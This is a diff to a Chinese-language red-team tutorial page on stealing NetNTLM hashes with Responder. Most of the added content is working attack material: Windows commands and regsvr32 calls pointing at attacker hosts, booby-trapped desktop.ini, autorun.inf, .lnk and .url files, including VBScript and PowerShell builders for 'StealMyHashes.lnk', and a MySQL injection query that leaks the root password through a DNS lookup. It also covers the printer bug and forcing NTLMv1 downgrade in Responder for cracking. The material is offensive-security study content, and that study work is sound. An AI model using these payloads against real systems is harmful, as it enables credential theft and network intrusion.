@@ -33,6 +33,9 @@ win10 主机 ping hello-world
 - [内网渗透之Responder攻防（上）](https://www.freebuf.com/articles/network/256844.html)
 - [内网渗透之Responder攻防（下）](https://www.freebuf.com/articles/network/265246.html)
 - [域内窃取哈希一些技术](https://mp.weixin.qq.com/s/y1ehsvJEBkZ-qynNrOlAuA)
+- [Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
+- [花式窃取NetNTLM哈希的方法](https://paper.seebug.org/474/)
+- [配置文件重定向获取NTLM v1\2 Hash](https://xz.aliyun.com/t/8544)
 
 ---
 
@@ -107,26 +110,15 @@ mspaint.exe \hostshare #(noisy, invalid path to png error)
 msra.exe /openfile \hostshare #(noisy, error)
 mstsc.exe \hostshare #(noisy, error)
 netcfg.exe -l \hostshare -c p -i foo
-```
-
-**MySQL**
-
-在 MySQL 注入的话，可以通过带外通信把数据带出来
-```
-SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.xxx.ceye.io\\abc'));
-```
-需要具备 loadfile 权限，且没有 securefile_priv 的限制 (5.5.53 默认是空，之后的话默认为 NULL 就不好利用了, 不排除一些管理员会改)
-
-LOAD_FILE 是支持 UNC 路劲,构造
-```
-select load_file('\\\\<Kali address>\\mysql');
-```
-
-**mssql**
-
-或者配合 mssql
-```
-xp_dirtree "\\<Kali address>\aaa.com"
+regsvr32 /s /u /i://x.x.x.x/@xxx scrobj.dll
+echo 1 > //192.168.0.1/abc
+pushd \\192.168.0.1\abc
+cmd /k \\192.168.0.1\abc
+cmd /c \\192.168.0.1\abc
+start \\192.168.0.1\abc
+mkdir \\192.168.0.1\abc
+type\\192.168.0.1\abc
+dir\\192.168.0.1\abc
 ```
 
 ## 通过文件获取hash
@@ -147,6 +139,13 @@ IconResource=\\hello-world\test\SHELL32.dll,2
 当其打开这个 test 文件夹的时候，受害主机就会去请求图标资源
 
 ![](../../../../../assets/img/Security/RedTeam/OS安全/实验/Responder欺骗/7.png)
+
+在 Windows XP 系统中，desktop.ini 文件使用 “IcondFile” 而不是“IconResource”。
+```
+[.ShellClassInfo]
+IconFile=\\1.1.1.1\aa
+IconIndex=1337
+```
 
 **SCF文件**
 
@@ -178,7 +177,16 @@ Command=ToggleDesktop
 
 ```
 <img src="\\<kali ip>\outlook">
+<img src="http://test/">
 ```
+
+这里支持两种协议,区别如下
+- UNC 默认携带凭据, 但是如果 IP 是公网 IP 的话, 很多公司是访问不到公网 445 的
+- HTTP 协议默认不携带凭据, 只有信任域 (域内 DNS 记录) 才会携带凭据. 域内的成员默认有增加 DNS 的权限, 可以用域内成员的权限在内网增加一条 DNS 记录.
+
+**pdf**
+- [deepzec/Bad-Pdf](https://github.com/deepzec/Bad-Pdf)
+  - [NTLM Credentials Theft via PDF Files](https://research.checkpoint.com/2018/ntlm-credentials-theft-via-pdf-files/)
 
 **office**
 
@@ -198,19 +206,86 @@ Target 参数修改为 UNC 路径，然后加上 `TargetMode="External"`
 
 ![](../../../../../assets/img/Security/RedTeam/OS安全/实验/Responder欺骗/18.png)
 
+**Autorun.inf**
+```
+[autorun]
+open=\\1.1.1.1\setup.exe
+icon=something.ico
+action=open Setup.exe
+```
+
+**Shortcut Files (.lnk)**
+
+我们可以创建一个包含网络路径的快捷方式，只要你打开快捷方式，Windows就会尝试解析网络路径，你还可以指定一个快捷键来触发这个快捷方式。至于图标，你可以给出一个Windows二进制文件的名称，或者从位于system32目录中的shell32.dll，Ieframe.dll，imageres.dll，pnidui.dll或wmploc.dll中选择一个图标。
+```
+Set shl = CreateObject(&quot;WScript.Shell&quot;)
+Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)
+currentFolder = shl.CurrentDirectory
+
+Set sc = shl.CreateShortcut(fso.BuildPath(currentFolder, &quot;\StealMyHashes.lnk&quot;))
+
+sc.TargetPath = &quot;\\1.1.1.1\@OsandaMalith&quot;
+sc.WindowStyle = 1
+sc.HotKey = &quot;Ctrl+Alt+O&quot;
+sc.IconLocation = &quot;%windir%\system32\shell32.dll, 3&quot;
+sc.Description = &quot;I will Steal your Hashes&quot;
+sc.Save
+```
+
+Powershell
+```
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("StealMyHashes.lnk")
+$lnk.TargetPath = "\\1.1.1.1\@OsandaMalith"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "I will Steal your Hashes"
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
+
+**Internet Shortcuts (.url)**
+
+Windows 中的另一个快捷方式是 Internet 快捷方式，你可以将下面这个存储为 .url 文件：
+```
+echo [InternetShortcut] > stealMyHashes.url
+echo URL=file://192.168.0.1/@OsandaMalith >> stealMyHashes.url
+```
+
 ## 通过 web 漏洞
 
-**xxe**
+- xxe
 
-在 xxe 里面加载外部文件的时候，如果路径支持 unc 路径的话，是能拿到 net-ntlm hash 的。
+  在 xxe 里面加载外部文件的时候，如果路径支持 unc 路径的话，是能拿到 net-ntlm hash 的。
 
-如果不支持 UNC，可再测试 http 协议。
+  如果不支持 UNC，可再测试 http 协议。
 
-**ssrf**
+- ssrf
 
-在 ssrf 里面如果支持 file 协议，并且 file 协议能加载远程资源的话，是能拿到 net-ntlm hash 的。
+  在 ssrf 里面如果支持 file 协议，并且 file 协议能加载远程资源的话，是能拿到 net-ntlm hash 的。
 
-当只支持 HTTP 协议的时候，也是可能打回 net-ntlm hash 的。
+  当只支持 HTTP 协议的时候，也是可能打回 net-ntlm hash 的。
+
+- XPath Injection
+- 远程文件包含
+- SQL Injection
+  - MySQL
+    在 MySQL 注入的话，可以通过带外通信把数据带出来
+    ```
+    SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.xxx.ceye.io\\abc'));
+    ```
+    需要具备 loadfile 权限，且没有 securefile_priv 的限制 (5.5.53 默认是空，之后的话默认为 NULL 就不好利用了, 不排除一些管理员会改)
+
+    LOAD_FILE 是支持 UNC 路劲,构造
+    ```
+    select load_file('\\\\<Kali address>\\mysql');
+    ```
+  - mssql
+
+    或者配合 mssql
+    ```
+    xp_dirtree "\\<Kali address>\aaa.com"
+    ```
 
 ## 通过错误域名获取hash
 
@@ -228,11 +303,13 @@ chrome 在开启 WPAD 设置时也会默认被欺骗(默认开启),firefox不会
 
 ## 其他
 
-**打印机**
+**打印机 printer bug**
 
 Windows 的 MS-RPRN 协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的 RpcRemoteFindFirstPrinterChangeNotificationEx() 调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。
 
-任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过 Kerberos 或 NTLM 进行验证）。另外微软表示这个 bug 是系统设计特点，无需修复。
+任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过 Kerberos 或 NTLM 进行验证）。微软表示这个 bug 是系统设计特点，无需修复。
+
+工作组触发 printerbug 是没问题，pipepotato 在工作组内也能起作用，问题在打印机服务是以 system 用户的权限运行的服务，system 用户在工作组内的网络凭据是匿名的，wireshark 抓包应该可以看到是 \，也就是不携带任何凭据。域内能利用是因为 system 用户在域内的网络凭据是机器用户的凭据。所以主要问题应该是网络凭据这块。network service 的网络凭据也是机器用户,pc默认会开启，且一般很少去关
 
 - **krbrelayx**
   - [dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)
@@ -277,13 +354,44 @@ win7 执行命令
 
 **为什么能破解 NTLMv1 hash？**
 
-windows 将 NTLM Hash 后面补 5 个字节 0，共 21 字节。
+- 加密方式1
 
-将步骤 1 处理后的 NTLM Hash 分成 3 组 7 字节，每 7 个比特后面添加 1 比特 0，组成 3 个 8 字节的 DES 密钥。
+  1. 将 16 字节的 NTLM hash 空填充为 21 个字节，然后分成三组，每组 7 字节。
+  2. 将三组 (每组 7 字节) 经过运算后作为 DES 加密算法的密钥
+  3. 加密 Server Challenge
+  4. 将这三个密文值连接起来得到 response。
 
-使用得到的 3 个密钥，分别对 8 字节的 challenge 进行 3DES 加密获得三组 8 字节密文，然后拼接共组成 24 字节的密文，这样就得到了 NTLMv1 hash。
+  总共三组，每组 8 个字节作为 key，加密 Server Challenge 获取 response。
 
-知道了其加密方式之后，由于 challenge 是固定的，所以可以建立从 key 到 response 的彩虹表，并在知道 response 的情况下获取 key，破解跟机器的密码强度没有关系，且成功率几乎为 100%。
+  每组可以分开计算，已知加密内容和加密后的密文算 key。使用 des 算法，key 是八个字节。
+
+  知道了其加密方式之后，控制 Server Challenge 为 1122334455667788，可以建立从 key 到 response 的彩虹表，并在知道 response 的情况下获取 key，破解跟机器的密码强度没有关系，且成功率几乎为 100%。
+
+- 加密方式2
+
+  第一种加密方式的加密内容是 Server Challenge。而这种加密方式是拼接 8 字节 Server Challenge 和 8 字节 Client Challenge 后，求其 MD5，然后取 MD5 值的前 8 字节做为加密内容。
+
+  我们可以控制 Server Challenge 为固定的值，但是没法控制 Client Challenge 的值。
+
+  第一种是加密的内容为固定的 1122334455667788 的话，我们只需要建立从 key 到 response 的彩虹表。而这种加密方式的话。加密的内容也是不固定的，计算的成本高
+
+**如何控制使用哪种 NTLMv1 hash 加密方式?**
+
+当 ntlm type2 `NTLMSSPNEGOTIATEEXTENDED_SESSIONSECURITY` 位置为 1 的时候, 加密的内容不是 server challenge，而是 md5 hash 运算过的 server challeng+client challent 的前 8 位。也就是说是第二种加密方式。
+
+把 `NTLMSSPNEGOTIATEEXTENDED_SESSIONSECURITY` 位置为 0，那么客户端就会选择加密方式 1. 并且 Server Challenge 为 1122334455667788 的情况下。我们用 crack.sh 快速免费有效得破解。获取到用户的 NTLM Hash。
+
+Resonder 加上 `–lm` , 调用的模块就是 SMB1LM, 版本的实现是在 smb 协商版本的时候就将 challenge 返回，并且将 `NTLMSSPNEGOTIATEEXTENDED_SESSIONSECURITY` 置为 0.
+
+在各个协议里面的 NTLM SSP 里面，修改 flag 位，我们找到 Responder 里面 type2 的 NTLM SSP 的 flag 位赋值的地方即可。
+
+- 比如 smb 部分的实现，在 `packets.py` 中的 SMBSession1Data 类
+
+  ![](../../../../../assets/img/Security/RedTeam/OS安全/实验/Responder欺骗/19.png)
+
+- http 在 `packets.py` 中的 NTLM_Challenge 类里面
+
+  ![](../../../../../assets/img/Security/RedTeam/OS安全/实验/Responder欺骗/20.png)
 
 ---
 
